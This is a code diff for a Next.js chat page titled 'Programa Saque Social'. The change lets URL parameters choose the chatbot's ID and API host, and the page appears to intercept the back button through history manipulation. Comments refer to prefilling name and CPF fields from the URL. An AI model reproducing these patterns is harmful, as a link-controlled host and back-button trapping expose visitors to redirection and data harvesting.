@@ -4,7 +4,6 @@
 import React, { useState, useEffect, Suspense, useRef } from 'react';
 import Head from 'next/head';
 import Image from 'next/image';
-// Script tag from next/script is removed as we are using dynamic import
 import { useSearchParams, useRouter } from 'next/navigation';
 import { MoreVertical, Cookie, LayoutGrid, User, Menu, Search } from 'lucide-react';
 import '../chat-page.css';
@@ -20,6 +19,7 @@ function ChatPageContent() {
     const currentQuery = searchParams.toString();
     const trimmedUrlBackRedirect = urlBackRedirect.trim() + (urlBackRedirect.includes("?") ? '&' : '?') + currentQuery;
 
+    // Prevent adding multiple history entries on re-renders if history state is already set
     if (window.history.state?.pageInitialized !== true) {
         history.pushState({ pageInitialized: true }, "", window.location.href);
     }
@@ -50,12 +50,9 @@ function ChatPageContent() {
     const typebotElement = document.querySelector('typebot-standard');
     if (!typebotElement) {
       console.error('Typebot standard element not found in DOM. Initialization aborted.');
-      // It's possible the element isn't rendered yet, this effect might run too early
-      // Or it's missing from JSX.
       return;
     }
 
-    // Check if Typebot content is already there (e.g., if it self-initialized or from a previous attempt)
     if (typebotElement.shadowRoot?.querySelector('.typebot-container')) {
       console.log('Typebot appears to be already initialized in the DOM.');
       typebotInitializedRef.current = true;
@@ -67,17 +64,26 @@ function ChatPageContent() {
       .then((TypebotModule) => {
         if (TypebotModule && TypebotModule.default && typeof TypebotModule.default.initStandard === 'function') {
           console.log('Successfully imported @typebot.io/js. Initializing Typebot...');
+          
+          const typebotIdFromQuery = searchParams.get('typebotId');
+          const apiHostFromQuery = searchParams.get('apiHost');
+
+          const typebotToUse = typebotIdFromQuery || "24lkdef"; // Default Typebot ID
+          const apiHostToUse = apiHostFromQuery || "https://chat.bestbot.info"; // Default API Host
+
+          console.log(`Initializing Typebot with ID: ${typebotToUse} and API Host: ${apiHostToUse}`);
+
           try {
             TypebotModule.default.initStandard({
-              typebot: "24lkdef", 
-              apiHost: "https://chat.bestbot.info",
-              // You can add prefill options here if needed, e.g.:
+              typebot: typebotToUse, 
+              apiHost: apiHostToUse,
+              // You can still add prefill options here if your Typebot is designed to use them
               // prefill: {
               //   nome: searchParams.get('nome') || '',
               //   cpf: searchParams.get('cpf') || '',
               // }
             });
-            typebotInitializedRef.current = true; // Mark as initialized
+            typebotInitializedRef.current = true; 
             console.log('Typebot.initStandard called successfully using imported module.');
           } catch (e) {
             console.error('Error during Typebot.initStandard call (imported module):', e);
@@ -96,11 +102,8 @@ function ChatPageContent() {
     <>
       <Head>
         <title>Programa Saque Social - Atendimento</title>
-        {/* Removed modulepreload link for CDN, as we are using npm package */}
       </Head>
       
-      {/* Removed next/script tag for local /js/typebot-web.js */}
-
       <div className="chat-page-body">
         <header className="chat-page-header">
           <div className="logo">
